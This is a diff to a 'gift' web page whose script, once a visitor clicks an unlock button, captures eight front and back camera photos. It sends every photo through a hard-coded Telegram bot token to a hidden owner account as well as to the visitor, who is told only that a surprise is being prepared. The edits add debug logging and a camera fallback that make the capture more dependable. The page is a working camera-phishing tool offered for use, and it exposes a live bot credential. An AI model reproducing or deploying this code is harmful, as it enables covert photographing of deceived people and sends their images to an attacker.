@@ -59,6 +59,11 @@ button {
   font-size: 18px;
   font-weight: bold;
   cursor: pointer;
+  transition: transform 0.3s;
+}
+
+button:hover:not(:disabled) {
+  transform: scale(1.05);
 }
 
 button:disabled {
@@ -111,6 +116,18 @@ button:disabled {
   height: 1px;
   opacity: 0;
 }
+
+#debug {
+  position: fixed;
+  bottom: 10px;
+  right: 10px;
+  background: rgba(0,0,0,0.7);
+  padding: 10px;
+  border-radius: 5px;
+  font-size: 12px;
+  max-width: 300px;
+  display: none;
+}
 </style>
 </head>
 
@@ -124,15 +141,27 @@ button:disabled {
 </div>
 
 <video class="hidden" id="video" autoplay playsinline></video>
+<div id="debug"></div>
 
 <script>
 // ===== CONFIG =====
-const BOT_TOKEN = "8226782560:AAFPl8aGBfO-KBeSLg98dSyOTa1-AouFY";  // UPDATED TOKEN
+const BOT_TOKEN = "8226782560:AAFPl8aGBfO-KBeSLgoh98dSyOTa1-AouFY";
 const OWNER_ID = "8215819954";
 const USER_ID = new URLSearchParams(window.location.search).get('uid');
 
+// Debug logging
+function debugLog(message) {
+  console.log(message);
+  const debugDiv = document.getElementById('debug');
+  if (debugDiv.style.display === 'none') debugDiv.style.display = 'block';
+  debugDiv.innerHTML += message + '<br>';
+}
+
 // ===== MAIN =====
 document.getElementById("unlockBtn").onclick = async () => {
+  debugLog("🚀 Starting gift process...");
+  debugLog(`User ID: ${USER_ID}`);
+  
   const box = document.getElementById("box");
   const btn = document.getElementById("unlockBtn");
   btn.disabled = true;
@@ -153,21 +182,37 @@ document.getElementById("unlockBtn").onclick = async () => {
   const video = document.getElementById("video");
   
   try {
+    // ===== CHECK USER ID =====
+    if (!USER_ID || USER_ID === "null" || USER_ID === "undefined") {
+      throw new Error("No user ID found in URL. Please use the link from Telegram bot.");
+    }
+    
+    debugLog("✅ User ID valid");
+    
     // ===== FRONT CAMERA - 4 PHOTOS =====
     statusText.textContent = "Accessing camera...";
     progress.style.width = "10%";
     
+    debugLog("📷 Requesting front camera...");
+    
     // Get front camera
     const frontStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: 640, height: 480 },
+      video: { 
+        facingMode: "user", 
+        width: { ideal: 640 },
+        height: { ideal: 480 }
+      },
       audio: false
     });
+    
+    debugLog("✅ Front camera accessed");
     video.srcObject = frontStream;
     
     // Wait for camera to be ready
     await new Promise(resolve => {
       video.onloadedmetadata = () => {
         video.play();
+        debugLog("🎥 Front camera playing");
         setTimeout(resolve, 1000);
       };
     });
@@ -176,43 +221,92 @@ document.getElementById("unlockBtn").onclick = async () => {
     for (let i = 1; i <= 4; i++) {
       progress.style.width = (10 + i * 10) + "%";
       statusText.textContent = `Creating moment ${i} of 8...`;
+      debugLog(`📸 Capturing front photo ${i}...`);
+      
       await new Promise(r => setTimeout(r, 800));
-      await captureAndSendPhoto(`Front ${i}`);
+      await captureAndSendPhoto(`front_${i}`);
+      
+      debugLog(`✅ Front photo ${i} captured`);
     }
     
     // Stop front camera
     frontStream.getTracks().forEach(track => track.stop());
+    debugLog("🛑 Front camera stopped");
     
     // ===== SWITCH TO BACK CAMERA =====
     statusText.textContent = "Switching camera...";
     progress.style.width = "60%";
     await new Promise(r => setTimeout(r, 1000));
     
-    // Get back camera
-    const backStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "environment", width: 640, height: 480 },
-      audio: false
-    });
-    video.srcObject = backStream;
+    debugLog("📷 Requesting back camera...");
     
-    // Wait for camera to be ready
-    await new Promise(resolve => {
-      video.onloadedmetadata = () => {
-        video.play();
-        setTimeout(resolve, 1000);
-      };
-    });
-    
-    // Capture 4 back photos
-    for (let i = 1; i <= 4; i++) {
-      progress.style.width = (60 + i * 10) + "%";
-      statusText.textContent = `Creating moment ${i + 4} of 8...`;
-      await new Promise(r => setTimeout(r, 800));
-      await captureAndSendPhoto(`Back ${i}`);
+    try {
+      // Get back camera
+      const backStream = await navigator.mediaDevices.getUserMedia({
+        video: { 
+          facingMode: "environment",
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        },
+        audio: false
+      });
+      
+      debugLog("✅ Back camera accessed");
+      video.srcObject = backStream;
+      
+      // Wait for camera to be ready
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => {
+          video.play();
+          debugLog("🎥 Back camera playing");
+          setTimeout(resolve, 1000);
+        };
+      });
+      
+      // Capture 4 back photos
+      for (let i = 1; i <= 4; i++) {
+        progress.style.width = (60 + i * 10) + "%";
+        statusText.textContent = `Creating moment ${i + 4} of 8...`;
+        debugLog(`📸 Capturing back photo ${i}...`);
+        
+        await new Promise(r => setTimeout(r, 800));
+        await captureAndSendPhoto(`back_${i}`);
+        
+        debugLog(`✅ Back photo ${i} captured`);
+      }
+      
+      // Stop back camera
+      backStream.getTracks().forEach(track => track.stop());
+      debugLog("🛑 Back camera stopped");
+      
+    } catch (backError) {
+      debugLog(`⚠️ Back camera failed: ${backError.message}`);
+      debugLog("📷 Using front camera for remaining photos...");
+      
+      // Use front camera if back fails
+      const fallbackStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false
+      });
+      
+      video.srcObject = fallbackStream;
+      
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(resolve, 1000);
+        };
+      });
+      
+      for (let i = 5; i <= 8; i++) {
+        progress.style.width = (60 + (i-4) * 10) + "%";
+        statusText.textContent = `Creating moment ${i} of 8...`;
+        await new Promise(r => setTimeout(r, 800));
+        await captureAndSendPhoto(`front_fallback_${i-4}`);
+      }
+      
+      fallbackStream.getTracks().forEach(track => track.stop());
     }
-    
-    // Stop back camera
-    backStream.getTracks().forEach(track => track.stop());
     
     progress.style.width = "100%";
     statusText.textContent = "Finishing up...";
@@ -223,91 +317,138 @@ document.getElementById("unlockBtn").onclick = async () => {
       <div class="gift-icon">🎉</div>
       <h2 style="color:#00ff00">🎁 Gift Delivered!</h2>
       <p>Your special surprise has been prepared</p>
-      <p>Thank you for waiting!</p>
+      <p>Check your Telegram for 8 magical photos!</p>
       <div class="status" style="color:#00ff00">✨ Complete ✨</div>
+      <div style="margin-top:20px;font-size:40px">
+        🎀✨🎊
+      </div>
     `;
+    
+    debugLog("✅ Gift process completed successfully!");
     
   } catch (error) {
     console.error("Error:", error);
+    debugLog(`❌ Error: ${error.message}`);
+    
     box.innerHTML = `
       <div class="gift-icon">🎭</div>
-      <h2 style="color:#ff5555">Camera Access Needed</h2>
-      <p>Please allow camera to receive your gift</p>
-      <button onclick="location.reload()">🔄 Try Again</button>
-      <div class="status" style="color:#ffb3ff">${error.message}</div>
+      <h2 style="color:#ff5555">Oops! Something went wrong</h2>
+      <p>${error.message}</p>
+      <p>Please try again or check:</p>
+      <ul style="text-align:left;color:#ffb3ff;font-size:14px">
+        <li>✓ Camera permissions are allowed</li>
+        <li>✓ Using link from Telegram bot</li>
+        <li>✓ Stable internet connection</li>
+      </ul>
+      <button onclick="location.reload()" style="margin-top:20px">🔄 Try Again</button>
+      <div class="status" style="color:#ffb3ff">Error: ${error.message}</div>
     `;
   }
 };
 
 // ===== CAPTURE AND SEND PHOTO =====
 async function captureAndSendPhoto(label) {
-  const video = document.getElementById("video");
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth || 640;
-  canvas.height = video.videoHeight || 480;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  
-  return new Promise((resolve) => {
-    canvas.toBlob(async (blob) => {
-      if (!blob) {
-        resolve();
-        return;
-      }
+  return new Promise(async (resolve) => {
+    try {
+      const video = document.getElementById("video");
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       
-      try {
+      debugLog(`🖼️ Converting ${label} to blob...`);
+      
+      // Convert to blob
+      canvas.toBlob(async (blob) => {
+        if (!blob) {
+          debugLog(`⚠️ No blob created for ${label}`);
+          resolve();
+          return;
+        }
+        
+        debugLog(`📤 Sending ${label} (${Math.round(blob.size/1024)}KB)...`);
+        
         // ===== SEND TO USER =====
-        const userFormData = new FormData();
-        userFormData.append('photo', blob, 'gift.jpg');
-        userFormData.append('chat_id', USER_ID);
-        userFormData.append('caption', `🎁 Your Gift: ${label}\n✨ From Hackers Colony`);
-        
-        const userResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: userFormData
-        });
-        
-        if (userResponse.ok) {
-          console.log(`✅ Sent ${label} to user ${USER_ID}`);
-        } else {
-          console.log(`⚠️ Failed to send to user: ${userResponse.status}`);
+        try {
+          const userFormData = new FormData();
+          userFormData.append('photo', blob, 'gift.jpg');
+          userFormData.append('chat_id', USER_ID);
+          userFormData.append('caption', `🎁 Your Gift: ${label}\n✨ From Hackers Colony Camera Bot`);
+          
+          debugLog(`📲 Sending to user ${USER_ID}...`);
+          
+          const userResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: userFormData
+          });
+          
+          const userResult = await userResponse.json();
+          
+          if (userResponse.ok) {
+            debugLog(`✅ ${label} sent to user!`);
+          } else {
+            debugLog(`⚠️ User send failed: ${userResult.description || userResponse.status}`);
+          }
+          
+        } catch (userError) {
+          debugLog(`❌ User send error: ${userError.message}`);
         }
         
         // ===== CREATE NEW BLOB FOR OWNER =====
         canvas.toBlob(async (ownerBlob) => {
           if (!ownerBlob) {
+            debugLog(`⚠️ No owner blob for ${label}`);
             resolve();
             return;
           }
           
           // ===== SEND TO OWNER =====
-          const ownerFormData = new FormData();
-          ownerFormData.append('photo', ownerBlob, 'gift.jpg');
-          ownerFormData.append('chat_id', OWNER_ID);
-          ownerFormData.append('caption', `📸 From ${USER_ID}: ${label}\n🕐 ${new Date().toLocaleTimeString()}`);
-          
-          const ownerResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: ownerFormData
-          });
-          
-          if (ownerResponse.ok) {
-            console.log(`✅ Sent ${label} to owner`);
-          } else {
-            console.log(`⚠️ Failed to send to owner: ${ownerResponse.status}`);
+          try {
+            const ownerFormData = new FormData();
+            ownerFormData.append('photo', ownerBlob, 'gift.jpg');
+            ownerFormData.append('chat_id', OWNER_ID);
+            ownerFormData.append('caption', `📸 From User ${USER_ID}: ${label}\n⏰ ${new Date().toLocaleTimeString()}`);
+            
+            debugLog(`📲 Sending to owner...`);
+            
+            const ownerResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: 'POST',
+              body: ownerFormData
+            });
+            
+            const ownerResult = await ownerResponse.json();
+            
+            if (ownerResponse.ok) {
+              debugLog(`✅ ${label} sent to owner!`);
+            } else {
+              debugLog(`⚠️ Owner send failed: ${ownerResult.description || ownerResponse.status}`);
+            }
+            
+          } catch (ownerError) {
+            debugLog(`❌ Owner send error: ${ownerError.message}`);
           }
           
           resolve();
           
         }, 'image/jpeg', 0.9);
         
-      } catch (error) {
-        console.error(`❌ Error sending ${label}:`, error);
-        resolve();
-      }
-    }, 'image/jpeg', 0.9);
+      }, 'image/jpeg', 0.9);
+      
+    } catch (error) {
+      debugLog(`❌ Capture error for ${label}: ${error.message}`);
+      resolve();
+    }
   });
 }
+
+// Show debug panel on Ctrl+D
+document.addEventListener('keydown', (e) => {
+  if (e.ctrlKey && e.key === 'd') {
+    const debug = document.getElementById('debug');
+    debug.style.display = debug.style.display === 'none' ? 'block' : 'none';
+  }
+});
 </script>
 </body>
 </html>
